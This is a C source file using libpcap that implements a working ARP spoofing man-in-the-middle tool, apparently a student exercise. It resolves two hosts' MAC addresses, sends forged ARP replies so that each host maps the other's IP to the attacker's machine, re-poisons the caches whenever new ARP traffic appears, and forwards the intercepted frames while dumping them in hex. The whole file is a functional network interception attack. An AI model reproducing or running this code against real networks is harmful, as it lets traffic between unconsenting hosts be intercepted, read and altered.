#include <stdio.h>
#include <pcap.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netdb.h>
#include <linux/if.h>

uint8_t mymac[6];
uint8_t myip[4];
uint8_t sendermac[6];
uint8_t senderip[4];
uint8_t targetmac[6];
uint8_t targetip[4];


struct arp_pac{
    uint8_t DesMac[6];
    uint8_t SouMac[6];
    uint8_t Type[2];
    uint8_t HWType[2];
    uint8_t ProtocolType[2];
    uint8_t HWSize[1];
    uint8_t ProSize[1];
    uint8_t Opcode[2];
    uint8_t SenderMac[6];
    uint8_t SenderIP[4];
    uint8_t TargetMac[6];
    uint8_t TargetIP[4];
    uint8_t padding[18];
    //60byte
};

void Send_Dirty_Packet(char* sender, char* target, char* dev, pcap_t* handle,int check)
{



    int i=0;

    uint8_t target_mac_addr[6];
    uint8_t sender_mac_addr[6];

    char* send;
    char* tar;


    //get Sender, Target IP Address
    uint8_t sender_ip[4];
    uint8_t target_ip[4];

    send = strtok(sender,".");
    while(send!=NULL){
        sender_ip[i] = atoi(send);
        send=strtok(NULL,".");
        i++;
    }
    memcpy(senderip,sender_ip,4);

    i=0;
    tar = strtok(target,".");
    while(tar!=NULL){
        target_ip[i]=atoi(tar);
        tar=strtok(NULL,".");
        i++;
    }
    memcpy(targetip,target_ip,4);

    //for my IP, Mac addr
    struct in_addr addr;
    struct ifreq s;
    int fd = socket(PF_INET,SOCK_DGRAM,IPPROTO_IP);
    strcpy(s.ifr_name,"ens33");
    ioctl(fd,SIOCGIFHWADDR,&s);

    for(i=0;i<6;i++){
        mymac[i] = (uint8_t)s.ifr_addr.sa_data[i];
    }

    fd = socket(AF_INET,SOCK_DGRAM,0);
    ioctl(fd, SIOCGIFADDR, &s);

    for(i=2;i<6;i++){
        myip[i-2]=(uint8_t)s.ifr_addr.sa_data[i];
    }




    //set arp packet without Mac, IP Address
    struct arp_pac send_first;
    memset(send_first.DesMac,0xff,sizeof(send_first.DesMac));   //broadcast
    send_first.Type[0] = 0x08;
    send_first.Type[1] = 0x06;
    send_first.HWType[0]=0x00;
    send_first.HWType[1]=0x01;
    send_first.ProtocolType[0]=0x08;
    send_first.ProtocolType[1]=0x00;
    send_first.HWSize[0]=6;
    send_first.ProSize[0]=4;
    send_first.Opcode[0]=0x00;
    send_first.Opcode[1]=0x01;
    memcpy(send_first.SouMac,mymac,6);
    memcpy(send_first.SenderMac,mymac,6);
    memcpy(send_first.SenderIP,myip,4);
    memset(send_first.TargetMac,0x00,sizeof(send_first.TargetMac));
    memcpy(send_first.TargetIP,target_ip,4);


    //first send packet (get Target Mac address)
    pcap_sendpacket(handle,(const u_char*)&send_first,42);

    u_char* packet;
    struct arp_pac *p1;
    struct pcap_pkthdr* header;


    int res=pcap_next_ex(handle, &header, &packet);
    p1 = (struct arp_pac *)packet;

    //if arp reply -> get target_mac, get targetmac

    while(1)
    {
        if(     p1->Type[0]==0x08
              &&p1->Type[1]==0x06
              &&p1->Opcode[1]==0x02
              &&memcmp(p1->SenderIP,target_ip,4)==0)
        {
            memcpy(target_mac_addr,p1->SenderMac,6);
            if(check == 1)
            {
                memcpy(targetmac,p1->SenderMac,6);
            }
            break;
        }
        else {
            res=pcap_next_ex(handle, &header, &packet);
            p1 = (struct arp_pac *)packet;
        }
    }



    memcpy(send_first.TargetIP,sender_ip,4);


    //second send packet (get Sender Mac address)
    pcap_sendpacket(handle,(const u_char*)&send_first,42);

    res=pcap_next_ex(handle, &header, &packet);
    p1 = (struct arp_pac *)packet;

    //if arp reply -> get sender_mac, get sendermac
    while(1)
    {
        if(     p1->Type[0]==0x08
              &&p1->Type[1]==0x06
              &&p1->Opcode[1]==0x02
              &&memcmp(p1->SenderIP,sender_ip,4)==0)
        {
            memcpy(sender_mac_addr,p1->SenderMac,6);
            if(check == 1)
            {
                memcpy(sendermac,p1->SenderMac,6);
            }
            break;
        }
        else {
            res=pcap_next_ex(handle, &header, &packet);
            p1 = (struct arp_pac *)packet;
        }
    }





    //packet setting for last send
    memcpy(send_first.DesMac,sender_mac_addr,6);
    memcpy(send_first.SouMac,mymac,6);
    send_first.Opcode[1]=0x02;
    memcpy(send_first.SenderMac,target_mac_addr,6);
    memcpy(send_first.SenderIP,target_ip,4);
    memcpy(send_first.TargetMac,sender_mac_addr,6);
    memcpy(send_first.TargetIP,sender_ip,4);




    //lastsend
    pcap_sendpacket(handle,(const u_char*)&send_first,42);
    
}




int main(int argc, char* argv[])
{

    //
    if(argc!=4)
    {
        //return -1;
    }

    int i=0;
    //need for cap packet
    char* dev = argv[1];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);

    //Send_Dirty_Packet();
    Send_Dirty_Packet(argv[2],argv[3],dev,handle,1);
    Send_Dirty_Packet(argv[3],argv[2],dev,handle,0);
    

    char* sender = argv[2];
    char* target = argv[3];

    //-------------------------------

    struct arp_pac send_first;
    send_first.Type[0] = 0x08;
    send_first.Type[1] = 0x06;
    send_first.HWType[0]=0x00;
    send_first.HWType[1]=0x01;
    send_first.ProtocolType[0]=0x08;
    send_first.ProtocolType[1]=0x00;
    send_first.HWSize[0]=6;
    send_first.ProSize[0]=4;
    send_first.Opcode[0]=0x00;
    send_first.Opcode[1]=0x01;

    //-------------------------------
    for(i=0;i<6;i++)
    {
        printf("%02x ",mymac[i]);
    }
    printf("\n");

    for(i=0;i<6;i++)
    {
        printf("%02x ",sendermac[i]);
    }
    printf("\n");

    for(i=0;i<6;i++)
    {
        printf("%02x ",targetmac[i]);
    }
    printf("\n");

    for(i=0;i<42;i++)
    {
        //printf("%x02x ",get_pac[i]);
    }

    struct pcap_pkthdr* header;
    const u_char* packet;
    int res=0;

    while(1)
    {
        res = pcap_next_ex(handle,&header,&packet);


        if(       packet[13]==0x06
                  &&packet[0]==mymac[0]
                  &&packet[1]==mymac[1]
                  &&packet[2]==mymac[2]
                  &&packet[3]==mymac[3]
                  &&packet[4]==mymac[4]
                  &&packet[5]==mymac[5])
        {
            //
            memcpy(send_first.DesMac,sendermac,6);
            memcpy(send_first.SouMac,mymac,6);
            send_first.Opcode[1]=0x02;
            memcpy(send_first.SenderMac,targetmac,6);
            memcpy(send_first.SenderIP,targetip,4);
            memcpy(send_first.TargetMac,sendermac,6);
            memcpy(send_first.TargetIP,senderip,4);
            pcap_sendpacket(handle,(const u_char*)&send_first,42);
            //
            memcpy(send_first.DesMac,targetmac,6);
            memcpy(send_first.SouMac,mymac,6);
            send_first.Opcode[1]=0x02;
            memcpy(send_first.SenderMac,sendermac,6);
            memcpy(send_first.SenderIP,senderip,4);
            memcpy(send_first.TargetMac,targetmac,6);
            memcpy(send_first.TargetIP,targetip,4);
            pcap_sendpacket(handle,(const u_char*)&send_first,42);

        }
        else{
            if(
                    packet[0]==mymac[0]
                    &&packet[1]==mymac[1]
                    &&packet[2]==mymac[2]
                    &&packet[3]==mymac[3]
                    &&packet[4]==mymac[4]
                    &&packet[5]==mymac[5]
                    &&packet[6]==sendermac[0]
                    &&packet[7]==sendermac[1]
                    &&packet[8]==sendermac[2]
                    &&packet[9]==sendermac[3]
                    &&packet[10]==sendermac[4]
                    &&packet[11]==sendermac[5])
            {

                for(i=0;i<header->caplen;i++)
                {
                    printf("%02x ",packet[i]);
                    if((i+1)%16==0)
                    {
                        printf("\n");
                    }
                }
                memcpy(packet,targetmac,6);
                memcpy(packet+6,mymac,6);
                printf("\n\n");
                for(i=0;i<header->caplen;i++)
                {
                    printf("%02x ",packet[i]);
                    if((i+1)%16==0)
                    {
                        printf("\n");
                    }
                }
                pcap_sendpacket(handle,packet,header->len);
            }
            else if(
                    packet[0]==mymac[0]
                    &&packet[1]==mymac[1]
                    &&packet[2]==mymac[2]
                    &&packet[3]==mymac[3]
                    &&packet[4]==mymac[4]
                    &&packet[5]==mymac[5]
                    &&packet[6]==targetmac[0]
                    &&packet[7]==targetmac[1]
                    &&packet[8]==targetmac[2]
                    &&packet[9]==targetmac[3]
                    &&packet[10]==targetmac[4]
                    &&packet[11]==targetmac[5])
            {

                for(i=0;i<header->caplen; i++)
                {
                    printf("%02x ",packet[i]);
                    if((i+1)%16==0)
                    {
                        printf("\n");
                    }
                }
                memcpy(packet,sendermac,6);
                memcpy(packet+6,mymac,6);
                printf("\n\n");
                for(i=0;i<header->caplen;i++)
                {
                    printf("%02x ",packet[i]);
                    if((i+1)%16==0)
                    {
                        printf("\n");
                    }
                }
                pcap_sendpacket(handle,packet,header->len);
            }
        }
    }

    //packet



    return 0;
}
